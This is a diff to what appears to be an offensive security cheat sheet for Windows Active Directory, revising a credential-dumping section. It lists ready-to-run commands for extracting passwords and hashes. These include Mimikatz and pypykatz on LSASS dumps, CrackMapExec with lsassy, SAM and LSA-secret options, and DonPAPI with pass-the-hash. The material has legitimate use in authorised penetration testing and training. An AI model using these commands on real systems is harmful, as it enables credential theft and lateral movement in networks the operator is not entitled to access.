@@ -47,33 +47,52 @@ Find-DomainShare -CheckShareAccess
 
 All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/
 
-## Dump LSASS
+## Dump credentials
 
-Mimikatz : Retrieve password/hash from a dump file :
-```markdown
-sekurlsa::minidump “XXXXXXXXX.DMP”
+### Mimikatz
+On Windows, retrieve password/hash from a dump file :
+```powershell
+sekurlsa::minidump "XXXXXXXXX.DMP"
 sekurlsa::logonPasswords
 ```
+On Kali, use pypykatz based on python :
+```bash
+pypykatz lsa minidump 'XXX.DMP'
+```
+
+### CrackMapExec
+
+Many possibilites. Use --local-auth if using a local admin account.
+With lsassy module :
+```bash
+crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' -M lsassy
+```
+Dump SAM (local hashes) :
+```bash
+crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --sam
+```
+Dump LSA secrets :
+```bash
+crackmapexec smb IP_ADDRESS/MASK -d 'DOMAIN'-u 'USER' -p 'PASSWORD' --lsa
+```
+### DonPAPI
+Use DonPAPI to retrieve a lot of credentials (wifi, dpapi keys, browsers passwords, ...) :
+```bash
+python3 DonPAPI.py domain/user:password@target
+```
+It's possible to use the tool with Pass-The-Hash :
+```bash
+python3 DonPAPI.py domain/user@target --hashes LM:NT
+```
+
+### Others
 
 Native Windows command :
-```markdown
+```powershell
 rundll32 keymgr.dll, KRShowKeyMgr
 ```
+Savoir : Mimikatz recompiled in Go lang : https://github.com/vincd/savoir
 
-CrackMapExec : Use the Mimikatz module
-```markdown
-cme smb IP_ADDRESS -u 'Administrator' -p 'PASS' -M lsassy
-```
-
-Savoir : Mimikatz recompiled in Go lang
-```markdown
-https://github.com/vincd/savoir
-```
-
-CrackMapExec : Dump local SAM hashes using local admin account
-```markdown
-crackmapexec smb IP_ADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam
-```
 ## Dump Everything
 https://github.com/login-securite/DonPAPI
 
